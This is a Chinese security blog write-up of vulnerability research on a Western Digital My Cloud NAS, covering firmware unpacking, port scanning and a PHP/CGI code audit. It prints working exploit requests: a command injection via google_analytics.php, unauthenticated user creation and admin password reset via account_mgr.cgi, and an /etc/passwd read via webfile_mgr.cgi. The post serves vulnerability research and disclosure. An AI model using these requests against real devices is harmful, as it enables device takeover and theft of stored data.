
# 【技术分享】动手教你来挖西部数据NAS的漏洞


                                阅读量   
                                **111455**
                            
                        |
                        
                                                                                                                                    ![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

[![](./img/85705/t01a02aa59aaf829239.jpg)](./img/85705/t01a02aa59aaf829239.jpg)

作者：[朱老黑](http://bobao.360.cn/member/contribute?uid=24641064)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**传送门**

[**【技术分享】看我如何黑掉西部数码的NAS设备（含演示视频）******](http://bobao.360.cn/learning/detail/3583.html)

**<br>**

**前言**

前一段时间在某平台上发现了国外安全团队爆出了西部数据NAS产品的80几个漏洞，但是并没有漏洞的详情，正好我司在用的产品中就有西部数据的NAS，于是就有了这篇文章，这里以此文章为基础，更多的人投入到智能硬件的安全研究中（其实更希望有机会和大牛们一起探讨，带我飞）。

<br>

**分析**

对于智能硬件的安全分析一般从其固件开始入手，获取固件的手段主要有以下几种

1、	官网获取

2、	智能硬件自带的固件备份功能

3、	外部能够利用的漏洞进行远程固件备份下载

4、	通过拆解设备，读取flash或者TLL连入设备进行固件提取

一些正规的厂商会把该项产品的所有固件都放到官网上供用户下载，西部数据就是其中之一，可以很轻松的从官网下载到对应设备的固件，这里我们的实验设备是西部数据My_Cloud EX2，实际上也就是西部数据NAS产品的乞丐版。。。通过官网我下载了大部分产品的固件，发现即本一致，所以漏洞基本上是通用的。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0101191a04666ffd29.png)

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c6d3564ff15e0538.png)

得到了设备的固件之后也就完成了安全测试之前的准备工作，下面进行安全测试。

首先对其进行端口扫描，nmap端口扫描结果如下

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0132a0a88d0e1364f2.png)

对以上结果分析之后大致可以分析出以下信息。

1、	存在两个三个端口对于HTTP进行相应，分别是80、443、49152

2、	存在mysql数据库

3、	存在8181未知端口

在硬件安全研究的过程中主要以端口为出发点，现在目标已经出现，下面对固件进行分析并进行解包分析。这里我们是用的是binwalk

使用命令

```
binwalk My_Cloud_KC2A_2.11.157.bin
```

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d063e4a24bd54739.png)

比较标准的文件，包含uboot和firmware，直接使用-eM命令进行解包，并得到其固件的系统文件

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011b2f36f877cdf7c7.png)

这里需要注意的是这里从固件中提取出来的文件和设备真正运行时的系统结构存在一定的差异。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012f473ecea8be2bb0.png)

在apache配置文件中我们找到了其web对应的路径，将其中的源代码拷贝出来，等待载入源代码审计工具中进行审计。

在进行审计之前先其文件和功能结构进行分析，西部数据的 web端功能由php调用系统实现，大致的结构主要如下

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dfdc4686fe0c8337.png)

其中80和443端口大家应该都比较熟悉，就是http和https的区别，其对应的web文件都是一样的；49152端口对应的是两个xml文件，能够实现的功能仅仅是获取NAS设备的设备信息；8181端口则对应的是西部数据的restsdk服务，本文暂且不进行讨论。

下面我们主要对80端口的代码进行审计分析。将代码拷贝出来并载入代码分析工具，由于是PHP代码，所以审计起来比较方便，因为审计工具比较多。

下面这张图老司机们基本上一眼就能看出来我用的是什么审计工具。。。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014cfa6e9c5fe3372a.png)

自动审计进行大致分析之后基本上找到了很多的危险函数，在经过仔细的分析之后我们大致找到了以下漏洞。

命令执行

越权

任意文件读取

越权操作

基本上通过这一系列漏洞可以通杀大部分的漏洞设备，下面我们详细分析。

<br>

**google_analytics.php远程命令执行漏洞**

在登录系统之后客户端会不断访问服务端的这一文件，并获取相关信息。在对其进行代码分析后发现其中存在危险函数system（），并在执行时能够载入变量。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0190a860cc9e49370b.png)

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0139d499785d7bfc07.png)

最重要的是对传入的参数没有进行过滤导致可以任意执行命令，在进行构造后我们就得到了第一个远程命令执行漏洞。



```
http://192.168.4.110/web/google_analytics.php
 post
cmd=set&amp;opt=pv-home | reboot |&amp;arg=
```

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f7f7851ae1b0e29a.png)

与之相类似的以下文件同样也存在远程命令执行漏洞。

<br>

**ftp_download.php远程命令执行**

ftp_download.php这个文件时NAS产品中基于FTP产品的应用，在国外大牛对西数NAS产品进行分析时也讲到了此文件的认证绕过，居然直接把认证文件给注释掉了。。。，其中最重要的是这个文件中相对应的功能也存在一个远程命令执行漏洞，这就是无需登录，远程命令执行。下面看仔细分析。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0101c8628fc9451bac.png)

在此文件实现对FTP任务的修改时，调用了system()函数执行系统命令，并且对用户输入的参数没有进行过滤，导致命令注入。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01526761be0a29b497.png)

在了解了这一漏洞之后我们进行构造，就得到了我们第二个命令执行漏洞。。。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0159c712f6cbef1c1f.png)

与之相类似的还有很多，这里并没有进行发掘。下面还有两个与和上面相不同的。

这两个文件是CGI文件，我们并没有对其进行逆向，这里只是简单地对其权限进行简单的探讨。

作为一种非常古老的web程序，被大量应用到物联网设备中，因此有很多的物联网设备的问题就是出在此处，比如很多的远程命令执行漏洞

[http://www.freebuf.com/articles/system/41479.html](http://www.freebuf.com/articles/system/41479.html) 

[http://www.myhack58.com/Article/html/3/62/2015/58737.htm](http://www.myhack58.com/Article/html/3/62/2015/58737.htm) 

这一些都是由于对CGI脚本的权限控制不当导致的命令执行，同样的这里西部数据NAS产片同样也存在这样的问题。

<br>

**account_mgr.cgi越权添加用户(无需登录)**

这个脚本是对NAS产品的账号进行控制管理，但是其对用户没有做认证，导致可以在没有登录的情况下进行密码修改，至于这里管理员账号的获取，请尝试安装西部数据的客户端，可以使用抓包软件抓取到其与api接口的请求，可以直接获取到所有的设备账号。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01844c1909a9e91271.png)

在抓包之后对数据包进行构造，成功添加用户。

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cd0e5ccbb07c19ee.png)

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0110bf26e467e513f9.png)

相对应的数据包



```
http://192.168.4.110/cgi-bin/account_mgr.cgi
cmd=cgi_user_add&amp;name=test123&amp;pw=MTExMTEx&amp;group=&amp;first_name=111&amp;last_name=111&amp;pw_onoff=1&amp;mail=111%40qq.com&amp;expires_time=
```

同样的除了添加用户的功能之外，还能够实现对管理员用户密码的修改

<br>

**account_mgr.cgi越权修改管理员密码(无需登录)**

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01710b086348ecb58b.png)



```
http://192.168.4.110/cgi-bin/account_mgr.cgi
cmd=cgi_modify_account&amp;mtype=3&amp;username=admin&amp;first_name=111&amp;last_name=111&amp;pw=MTIzMTIz&amp;old_pw=&amp;mail=&amp;group=&amp;available1=0&amp;available2=&amp;available3=&amp;available4=&amp;pw_off=&amp;oldMail=&amp;oldName=test123&amp;type=local&amp;expires_time=&amp;admin
```

还有一些其他的安全问题

<br>

**webfile_mgr.cgi任意文件读取导致信息泄露**

[![](./img/85705/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e9160df2a10d1bf4.png)



```
http://192.168.4.110/cgi-bin/webfile_mgr.cgi
提交参数
cmd=cgi_download&amp;path=%2Fetc%2Fpasswd&amp;path1=%2Fetc%2Fpasswd&amp;name=passwd&amp;type=MD+File&amp;browser=f&amp;os=W
```



**总结**

西部数据的这些漏洞还是比较典型的，基本主要成因还是代码的编写过则过于松懈，导致很多的漏洞出现，对于这次的NAS产品系列漏洞的产生实际上危害并没有我们想象的那么大，因为西部数据的NAS产品除了经过特殊设置，大部分只能通过同一网段进行访问，所以这就很大程度上减少了其危害程度，只是对于局域网中，这些漏洞足以致命。

欢迎各位大牛带我飞

<br>



**传送门**

[**【技术分享】看我如何黑掉西部数码的NAS设备（含演示视频）******](http://bobao.360.cn/learning/detail/3583.html)

<br>
